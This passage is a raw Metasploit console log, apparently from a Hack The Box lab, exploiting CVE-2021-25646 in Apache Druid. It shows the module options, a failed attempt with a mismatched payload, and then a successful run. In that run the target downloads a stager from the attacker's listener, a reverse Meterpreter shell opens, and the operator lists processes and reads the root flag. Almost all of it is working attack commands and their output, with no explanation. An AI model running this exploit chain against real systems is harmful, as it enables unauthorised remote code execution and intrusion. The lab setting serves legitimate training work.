+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set LHOST 10.10.14.4
+LHOST => 10.10.14.4
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set RHOSTS 10.129.203.52
+RHOSTS => 10.129.203.52
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
+[-] Exploit failed: windows/meterpreter/reverse_tcp is not a compatible payload.
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> info
+
+       Name: Apache Druid 0.20.0 Remote Command Execution
+     Module: exploit/linux/http/apache_druid_js_rce
+   Platform: Linux, Unix
+       Arch: x86, x64, cmd
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2021-01-21
+
+Provided by:
+  Litch1, Security Team of Alibaba Cloud
+  je5442804
+
+Module side effects:
+ ioc-in-logs
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Linux (dropper)
+      1   Unix (in-memory)
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting  Required  Description
+  ----       ---------------  --------  -----------
+  Proxies                     no        A proxy chain of format type:host:port[,type:host:p
+                                        ort][...]. Supported proxies: sapni, socks4, http,
+                                        socks5, socks5h
+  RHOSTS     10.129.203.52    yes       The target host(s), see https://docs.metasploit.com
+                                        /docs/using-metasploit/basics/using-metasploit.html
+  RPORT      8888             yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  SSLCert                     no        Path to a custom SSL certificate (default is random
+                                        ly generated)
+  TARGETURI  /                yes       The base path of Apache Druid
+  URIPATH                     no        The URI to use for this exploit (default is random)
+  VHOST                       no        HTTP server virtual host
+
+
+  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. Thi
+                                      s must be an address on the local machine or 0.0.0.0
+                                      to listen on all addresses.
+  SRVPORT  8080             yes       The local port to listen on.
+
+Payload information:
+
+Description:
+  Apache Druid includes the ability to execute user-provided JavaScript code embedded in
+  various types of requests; however, that feature is disabled by default.
+
+  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request
+  that both enables the JavaScript code-execution feature and executes the supplied code all
+  at once, allowing for code execution on the server with the privileges of the Druid Server process.
+  More critically, authentication is not enabled in Apache Druid by default.
+
+  Tested on the following Apache Druid versions:
+
+  * 0.15.1
+  * 0.16.0-iap8
+  * 0.17.1
+  * 0.18.0-iap3
+  * 0.19.0-iap7
+  * 0.20.0-iap4.1
+  * 0.20.0
+  * 0.21.0-iap3
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2021-25646
+  https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E
+  https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> set payload payload/linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(linux/http/apache_druid_js_rce) >> run
+[*] Started reverse TCP handler on 10.10.14.4:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Using URL: http://10.10.14.4:8080/3mSWWqB
+[*] Client 10.129.203.52 (curl/7.68.0) requested /3mSWWqB
+[*] Sending payload to 10.129.203.52 (curl/7.68.0)
+[*] Sending stage (3090404 bytes) to 10.129.203.52
+[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.129.203.52:52644) at 2026-05-27 14:37:24 -0400
+[*] Command Stager progress - 100.00% done (110/110 bytes)
+[*] Server stopped.
+
+(Meterpreter 2)(/root/druid) > ps | head
+Filtering on 'head'
+No matching processes were found.
+(Meterpreter 2)(/root/druid) > ps | more
+Filtering on 'more'
+No matching processes were found.
+(Meterpreter 2)(/root/druid) > ps
+
+Process List
+============
+
+ PID   PPID  Name                Arch    User              Path
+ ---   ----  ----                ----    ----              ----
+ 1     0     systemd             x86_64  root              /usr/lib/systemd/systemd
+ 3     2     [rcu_gp]            x86_64  root
+ 4     2     [rcu_par_gp]        x86_64  root
+ 6     2     [kworker/0:0H-kblo  x86_64  root
+             ckd]
+ 9     2     [mm_percpu_wq]      x86_64  root
+ 10    2     [ksoftirqd/0]       x86_64  root
+ 11    2     [rcu_sched]         x86_64  root
+ 12    2     [migration/0]       x86_64  root
+ 13    2     [idle_inject/0]     x86_64  root
+ 14    2     [cpuhp/0]           x86_64  root
+ 15    2     [cpuhp/1]           x86_64  root
+ 16    2     [idle_inject/1]     x86_64  root
+ 17    2     [migration/1]       x86_64  root
+ 18    2     [ksoftirqd/1]       x86_64  root
+ 20    2     [kworker/1:0H-kblo  x86_64  root
+             ckd]
+ 21    2     [kdevtmpfs]         x86_64  root
+ 22    2     [netns]             x86_64  root
+ 23    2     [rcu_tasks_kthre]   x86_64  root
+ 24    2     [kauditd]           x86_64  root
+ 25    2     [khungtaskd]        x86_64  root
+ 26    2     [oom_reaper]        x86_64  root
+ 27    2     [writeback]         x86_64  root
+ 28    2     [kcompactd0]        x86_64  root
+ 29    2     [ksmd]              x86_64  root
+ 30    2     [khugepaged]        x86_64  root
+ 35    2     [kworker/1:1-event  x86_64  root
+             s]
+ 77    2     [kintegrityd]       x86_64  root
+ 78    2     [kblockd]           x86_64  root
+ 79    2     [blkcg_punt_bio]    x86_64  root
+ 80    2     [tpm_dev_wq]        x86_64  root
+ 81    2     [ata_sff]           x86_64  root
+ 82    2     [md]                x86_64  root
+ 83    2     [edac-poller]       x86_64  root
+ 84    2     [devfreq_wq]        x86_64  root
+ 85    2     [watchdogd]         x86_64  root
+ 88    2     [kswapd0]           x86_64  root
+ 89    2     [ecryptfs-kthrea]   x86_64  root
+ 91    2     [kthrotld]          x86_64  root
+ 92    2     [irq/24-pciehp]     x86_64  root
+ 93    2     [irq/25-pciehp]     x86_64  root
+ 94    2     [irq/26-pciehp]     x86_64  root
+ 95    2     [irq/27-pciehp]     x86_64  root
+ 96    2     [irq/28-pciehp]     x86_64  root
+ 97    2     [irq/29-pciehp]     x86_64  root
+ 98    2     [irq/30-pciehp]     x86_64  root
+ 99    2     [irq/31-pciehp]     x86_64  root
+ 100   2     [irq/32-pciehp]     x86_64  root
+ 101   2     [irq/33-pciehp]     x86_64  root
+ 102   2     [irq/34-pciehp]     x86_64  root
+ 103   2     [irq/35-pciehp]     x86_64  root
+ 104   2     [irq/36-pciehp]     x86_64  root
+ 105   2     [irq/37-pciehp]     x86_64  root
+ 106   2     [irq/38-pciehp]     x86_64  root
+ 107   2     [irq/39-pciehp]     x86_64  root
+ 108   2     [irq/40-pciehp]     x86_64  root
+ 109   2     [irq/41-pciehp]     x86_64  root
+ 110   2     [irq/42-pciehp]     x86_64  root
+ 111   2     [irq/43-pciehp]     x86_64  root
+ 112   2     [irq/44-pciehp]     x86_64  root
+ 113   2     [irq/45-pciehp]     x86_64  root
+ 114   2     [irq/46-pciehp]     x86_64  root
+ 115   2     [irq/47-pciehp]     x86_64  root
+ 116   2     [irq/48-pciehp]     x86_64  root
+ 117   2     [irq/49-pciehp]     x86_64  root
+ 118   2     [irq/50-pciehp]     x86_64  root
+ 119   2     [irq/51-pciehp]     x86_64  root
+ 120   2     [irq/52-pciehp]     x86_64  root
+ 121   2     [irq/53-pciehp]     x86_64  root
+ 122   2     [irq/54-pciehp]     x86_64  root
+ 123   2     [irq/55-pciehp]     x86_64  root
+ 124   2     [acpi_thermal_pm]   x86_64  root
+ 125   2     [scsi_eh_0]         x86_64  root
+ 126   2     [scsi_tmf_0]        x86_64  root
+ 127   2     [scsi_eh_1]         x86_64  root
+ 128   2     [scsi_tmf_1]        x86_64  root
+ 130   2     [vfio-irqfd-clea]   x86_64  root
+ 131   2     [ipv6_addrconf]     x86_64  root
+ 141   2     [kstrp]             x86_64  root
+ 144   2     [kworker/u5:0]      x86_64  root
+ 157   2     [charger_manager]   x86_64  root
+ 202   2     [cryptd]            x86_64  root
+ 213   2     [irq/16-vmwgfx]     x86_64  root
+ 217   2     [ttm_swap]          x86_64  root
+ 218   2     [mpt_poll_0]        x86_64  root
+ 223   2     [mpt/0]             x86_64  root
+ 226   2     [scsi_eh_2]         x86_64  root
+ 238   2     [scsi_tmf_2]        x86_64  root
+ 239   2     [scsi_eh_3]         x86_64  root
+ 240   2     [scsi_tmf_3]        x86_64  root
+ 242   2     [scsi_eh_4]         x86_64  root
+ 244   2     [scsi_tmf_4]        x86_64  root
+ 246   2     [scsi_eh_5]         x86_64  root
+ 247   2     [scsi_tmf_5]        x86_64  root
+ 248   2     [scsi_eh_6]         x86_64  root
+ 249   2     [scsi_tmf_6]        x86_64  root
+ 250   2     [scsi_eh_7]         x86_64  root
+ 251   2     [scsi_tmf_7]        x86_64  root
+ 252   2     [scsi_eh_8]         x86_64  root
+ 253   2     [scsi_tmf_8]        x86_64  root
+ 254   2     [scsi_eh_9]         x86_64  root
+ 255   2     [scsi_tmf_9]        x86_64  root
+ 256   2     [scsi_eh_10]        x86_64  root
+ 257   2     [scsi_tmf_10]       x86_64  root
+ 258   2     [scsi_eh_11]        x86_64  root
+ 259   2     [scsi_tmf_11]       x86_64  root
+ 260   2     [scsi_eh_12]        x86_64  root
+ 261   2     [scsi_tmf_12]       x86_64  root
+ 262   2     [scsi_eh_13]        x86_64  root
+ 263   2     [scsi_tmf_13]       x86_64  root
+ 265   2     [scsi_eh_14]        x86_64  root
+ 266   2     [scsi_tmf_14]       x86_64  root
+ 267   2     [scsi_eh_15]        x86_64  root
+ 268   2     [scsi_tmf_15]       x86_64  root
+ 269   2     [scsi_eh_16]        x86_64  root
+ 270   2     [scsi_tmf_16]       x86_64  root
+ 271   2     [scsi_eh_17]        x86_64  root
+ 272   2     [scsi_tmf_17]       x86_64  root
+ 273   2     [scsi_eh_18]        x86_64  root
+ 274   2     [scsi_tmf_18]       x86_64  root
+ 275   2     [scsi_eh_19]        x86_64  root
+ 276   2     [scsi_tmf_19]       x86_64  root
+ 277   2     [scsi_eh_20]        x86_64  root
+ 278   2     [scsi_tmf_20]       x86_64  root
+ 279   2     [scsi_eh_21]        x86_64  root
+ 280   2     [scsi_tmf_21]       x86_64  root
+ 281   2     [scsi_eh_22]        x86_64  root
+ 282   2     [scsi_tmf_22]       x86_64  root
+ 283   2     [scsi_eh_23]        x86_64  root
+ 284   2     [scsi_tmf_23]       x86_64  root
+ 285   2     [scsi_eh_24]        x86_64  root
+ 286   2     [scsi_tmf_24]       x86_64  root
+ 287   2     [scsi_eh_25]        x86_64  root
+ 288   2     [scsi_tmf_25]       x86_64  root
+ 289   2     [scsi_eh_26]        x86_64  root
+ 290   2     [scsi_tmf_26]       x86_64  root
+ 291   2     [scsi_eh_27]        x86_64  root
+ 292   2     [scsi_tmf_27]       x86_64  root
+ 293   2     [scsi_eh_28]        x86_64  root
+ 294   2     [scsi_tmf_28]       x86_64  root
+ 295   2     [scsi_eh_29]        x86_64  root
+ 296   2     [scsi_tmf_29]       x86_64  root
+ 297   2     [scsi_eh_30]        x86_64  root
+ 298   2     [scsi_tmf_30]       x86_64  root
+ 299   2     [scsi_eh_31]        x86_64  root
+ 300   2     [scsi_tmf_31]       x86_64  root
+ 325   2     [kworker/u4:28-eve  x86_64  root
+             nts_power_efficien
+             t]
+ 329   2     [scsi_eh_32]        x86_64  root
+ 330   2     [scsi_tmf_32]       x86_64  root
+ 331   2     [kworker/0:1H-kblo  x86_64  root
+             ckd]
+ 342   2     [kdmflush]          x86_64  root
+ 369   2     [raid5wq]           x86_64  root
+ 413   2     [kworker/1:1H-kblo  x86_64  root
+             ckd]
+ 414   2     [jbd2/dm-0-8]       x86_64  root
+ 415   2     [ext4-rsv-conver]   x86_64  root
+ 472   1     systemd-journald    x86_64  root              /usr/lib/systemd/systemd-journal
+                                                           d
+ 494   2     [ipmi-msghandler]   x86_64  root
+ 504   1     systemd-udevd       x86_64  root              /usr/lib/systemd/systemd-udevd
+ 519   1     systemd-networkd    x86_64  systemd-network   /usr/lib/systemd/systemd-network
+                                                           d
+ 637   2     [kaluad]            x86_64  root
+ 638   2     [kmpath_rdacd]      x86_64  root
+ 639   2     [kmpathd]           x86_64  root
+ 640   2     [kmpath_handlerd]   x86_64  root
+ 641   1     multipathd          x86_64  root              /usr/sbin/multipathd
+ 649   2     [jbd2/sda2-8]       x86_64  root
+ 650   2     [ext4-rsv-conver]   x86_64  root
+ 663   1     systemd-timesyncd   x86_64  systemd-timesync  /usr/lib/systemd/systemd-timesyn
+                                                           cd
+ 682   1     VGAuthService       x86_64  root              /usr/bin/VGAuthService
+ 683   1     vmtoolsd            x86_64  root              /usr/bin/vmtoolsd
+ 703   1     accounts-daemon     x86_64  root              /usr/lib/accountsservice/account
+                                                           s-daemon
+ 704   1     dhclient            x86_64  root              /usr/sbin/dhclient
+ 707   1     dbus-daemon         x86_64  messagebus        /usr/bin/dbus-daemon
+ 714   1     irqbalance          x86_64  root              /usr/sbin/irqbalance
+ 717   1     python3             x86_64  root              /usr/bin/python3.8
+ 718   1     polkitd             x86_64  root              /usr/lib/policykit-1/polkitd
+ 719   1     rsyslogd            x86_64  syslog            /usr/sbin/rsyslogd
+ 722   1     systemd-logind      x86_64  root              /usr/lib/systemd/systemd-logind
+ 725   1     udisksd             x86_64  root              /usr/lib/udisks2/udisksd
+ 739   2     [kworker/1:5-event  x86_64  root
+             s]
+ 759   1     ModemManager        x86_64  root              /usr/sbin/ModemManager
+ 850   1     systemd-resolved    x86_64  systemd-resolve   /usr/lib/systemd/systemd-resolve
+                                                           d
+ 893   1     freshclam           x86_64  clamav            /usr/bin/freshclam
+ 899   1     cron                x86_64  root              /usr/sbin/cron
+ 906   1     python3             x86_64  root              /usr/bin/python3.8
+ 908   1     atd                 x86_64  root              /usr/sbin/atd
+ 920   1     perl                x86_64  root              /usr/bin/perl
+ 925   1     sshd                x86_64  root              /usr/sbin/sshd
+ 933   1     agetty              x86_64  root              /usr/sbin/agetty
+ 944   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 945   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 946   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 947   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 948   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 949   920   java                x86_64  root              /usr/lib/jvm/java-8-openjdk-amd6
+                                                           4/jre/bin/java
+ 1154  1     snort               x86_64  snort             /usr/sbin/snort
+ 2104  2     [kworker/u4:0-even  x86_64  root
+             ts_power_efficient
+             ]
+ 2105  2     [kworker/0:0-event  x86_64  root
+             s]
+ 2108  2     [kworker/0:1-event  x86_64  root
+             s]
+ 2262  2     [kworker/u4:1-even  x86_64  root
+             ts_power_efficient
+             ]
+ 2309  2     [kworker/1:0-event  x86_64  root
+             s]
+ 2396  945   sh                  x86_64  root              /usr/bin/dash
+ 2399  2396  axjZtKpt            x86_64  root              /tmp/axjZtKpt
+
+(Meterpreter 2)(/root/druid) > migrate 1
+[-] The "migrate" command is not supported by this Meterpreter type (x64/linux)
+(Meterpreter 2)(/root/druid) > cd ..
+(Meterpreter 2)(/root) > ls
+Listing: /root
+==============
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100600/rw-------  168   fil   2022-05-16 07:07:41 -0400  .bash_history
+100644/rw-r--r--  3137  fil   2022-05-11 09:43:25 -0400  .bashrc
+040700/rwx------  4096  dir   2022-05-16 07:04:45 -0400  .cache
+040700/rwx------  4096  dir   2022-05-16 06:54:48 -0400  .config
+100644/rw-r--r--  161   fil   2019-12-05 09:39:21 -0500  .profile
+100644/rw-r--r--  75    fil   2022-05-16 04:45:33 -0400  .selected_editor
+040700/rwx------  4096  dir   2021-10-06 13:37:09 -0400  .ssh
+100644/rw-r--r--  212   fil   2022-05-11 10:10:43 -0400  .wget-hsts
+040755/rwxr-xr-x  4096  dir   2022-05-11 08:51:45 -0400  druid
+100755/rwxr-xr-x  95    fil   2022-05-16 06:31:10 -0400  druid.sh
+100644/rw-r--r--  22    fil   2022-05-16 06:01:15 -0400  flag.txt
+040755/rwxr-xr-x  4096  dir   2021-10-06 13:37:19 -0400  snap
+
+(Meterpreter 2)(/root) > cat flag.txt 
+HTB{MSF_Expl01t4t10n}
+(Meterpreter 2)(/root) > ```
